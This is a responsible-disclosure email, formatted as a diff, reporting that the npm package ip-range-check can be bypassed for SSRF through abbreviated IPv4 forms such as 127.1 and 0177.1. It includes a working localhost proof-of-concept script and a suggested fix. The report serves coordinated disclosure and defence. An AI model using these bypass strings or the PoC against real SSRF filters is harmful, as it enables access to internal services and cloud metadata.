@@ -1,0 +1,140 @@
+To: desk+npm@danielcompton.net
+Subject: [Security] SSRF denylist bypass in ip-range-check via abbreviated IPv4 notation
+
+Hi Daniel,
+
+I'm reporting a security issue privately in ip-range-check (npm), as the repo has no
+SECURITY.md or private vulnerability reporting enabled. Please let me know if you'd
+prefer a different channel.
+
+in summary:
+
+ip-range-check is commonly used as an SSRF guard: an app builds a denylist of
+private CIDR ranges and rejects any user-supplied host that matches, e.g.
+
+    if (ipRangeCheck(host, ['127.0.0.0/8','10.0.0.0/8','169.254.0.0/16', ...]))
+        throw new Error('blocked')
+
+Several abbreviated IPv4 forms that the OS socket layer still routes to a private
+address are NOT recognized by ip-range-check, so it returns false ("not in range"),
+the guard treats the host as public, and the request reaches the internal target.
+
+Confirmed bypasses (each routes to 127.0.0.1, guard returns false):
+
+    127.1      -> 127.0.0.1
+    127.0.1    -> 127.0.0.1
+    0177.1     -> 127.0.0.1
+    127.0x1    -> 127.0.0.1
+
+Control: 127.0.0.1 is correctly blocked. The same class also evades RFC1918
+ranges (10.1 -> 10.0.0.1, 192.168.257 -> 192.168.1.1, etc.).
+
+the root cause:
+
+check_single_cidr() calls ipaddr.process(addr) and returns false on any parse
+failure:
+
+    catch (e) { return false }   // "not in range" == allowed, for a denylist
+
+The bundled ipaddr.js@1.9.1 parses full decimal/hex/octal integer forms (so
+2130706433, 0x7f000001, 017700000001 are correctly blocked) but throws on the
+abbreviated a.b / a.b.c and mixed-radix forms (127.1, 0177.1, 127.0x1). Node's
+resolver (inet_aton) routes those to the private address, so the validator and
+the connector disagree.
+
+why this matters (with honest scope):
+
+SSRF filter bypass to loopback / RFC1918 / link-local (incl. 169.254.169.254 cloud
+metadata). This requires the RAW host string to reach both the guard and the
+connector -- true for a raw user "host" field, or a legacy url.parse().hostname
+(which preserves 127.1). It is NOT exploitable when the app normalizes via the
+WHATWG new URL() parser first, which canonicalizes 127.1 -> 127.0.0.1 (then the
+guard blocks it). Stating this so the severity isn't overstated.
+
+Same bug class as the ip package (CVE-2023-42282 / CVE-2024-29415).
+
+the poc:
+
+Full connect-verified PoC below (I couldn't attach the .mjs file, so it's inline).
+It binds an internal service to 127.0.0.1, builds the denylist guard, and shows the
+abbreviated hosts pass the guard AND a real http.get reaches the internal service.
+
+To reproduce:
+  npm install ip-range-check@0.2.0
+  node poc.mjs
+
+Expected output:
+  Control - guard on canonical 127.0.0.1: allows=false (correctly blocked)
+  127.1      guard=ALLOWED  ->  fetch returned "INTERNAL-SECRET-DATA"   <== SSRF: reached internal service
+  127.0.1    guard=ALLOWED  ->  fetch returned "INTERNAL-SECRET-DATA"   <== SSRF: reached internal service
+  0177.1     guard=ALLOWED  ->  fetch returned "INTERNAL-SECRET-DATA"   <== SSRF: reached internal service
+  127.0x1    guard=ALLOWED  ->  fetch returned "INTERNAL-SECRET-DATA"   <== SSRF: reached internal service
+
+--- poc.mjs ---
+
+import http from 'node:http'
+import { createRequire } from 'node:module'
+const require = createRequire(import.meta.url)
+const ipRangeCheck = require('ip-range-check')
+
+// A typical private-range denylist a developer would build to prevent SSRF.
+const PRIVATE_RANGES = [
+  '127.0.0.0/8',    // loopback
+  '10.0.0.0/8',     // RFC1918
+  '172.16.0.0/12',  // RFC1918
+  '192.168.0.0/16', // RFC1918
+  '169.254.0.0/16', // link-local / cloud metadata (169.254.169.254)
+  '::1/128', 'fc00::/7', 'fe80::/10',
+]
+
+// The SSRF guard a developer would write: true = SAFE (not in a private range).
+const guardAllows = (host) => !ipRangeCheck(host, PRIVATE_RANGES)
+
+// Stand-in for an internal-only service bound to loopback.
+const internal = http.createServer((_req, res) => res.end('INTERNAL-SECRET-DATA'))
+await new Promise((r) => internal.listen(0, '127.0.0.1', r))
+const port = internal.address().port
+
+// Attacker hosts: all route to 127.0.0.1 via the OS resolver, but ipaddr.js@1.9.1
+// (bundled by ip-range-check) throws parsing them, so the catch-all returns false.
+const attackerHosts = ['127.1', '127.0.1', '0177.1', '127.0x1']
+const control = '127.0.0.1'
+
+console.log(`Internal service bound to 127.0.0.1:${port}\n`)
+console.log(`Control - guard on canonical ${control}: allows=${guardAllows(control)} (correctly blocked)\n`)
+
+for (const host of attackerHosts) {
+  if (!guardAllows(host)) { console.log(`  ${host.padEnd(10)} guard=BLOCKED`); continue }
+  const body = await fetchVia(host, port)
+  const pwned = body.includes('INTERNAL-SECRET-DATA')
+  console.log(`  ${host.padEnd(10)} guard=ALLOWED  ->  fetch returned ${JSON.stringify(body)}` +
+    (pwned ? '   <== SSRF: reached internal service' : ''))
+}
+internal.close()
+
+// Uses the RAW host (as a legacy url.parse or a raw user "host" field would yield).
+// NB: the modern WHATWG new URL() normalises these forms and is NOT affected.
+function fetchVia(host, port) {
+  return new Promise((res) => {
+    const req = http.get({ host, port, path: '/' }, (r) => {
+      let d = ''; r.on('data', (c) => (d += c)); r.on('end', () => res(d))
+    })
+    req.on('error', (e) => res('ERR:' + e.code))
+    req.setTimeout(1500, () => { req.destroy(); res('TIMEOUT') })
+  })
+}
+
+--- end of poc.mjs ---
+
+my suggested fix:
+
+Do not return false on parse failure in a denial decision -- distinguish
+"not in range" from "unparseable". Canonicalize the address (or upgrade the IP
+parser so abbreviated forms are parsed) before comparison, and/or reject inputs
+that are not valid canonical IPs so callers must pass a normalized address.
+
+One more thing, would you be willing to request a CVE ID via GitHub when you
+publish a fix/advisory? I'll hold off on public disclosure until a fix is released.
+
+Thanks for building and sharing ip-range-check over the years,
+Youssef Aboukir (onevilx)
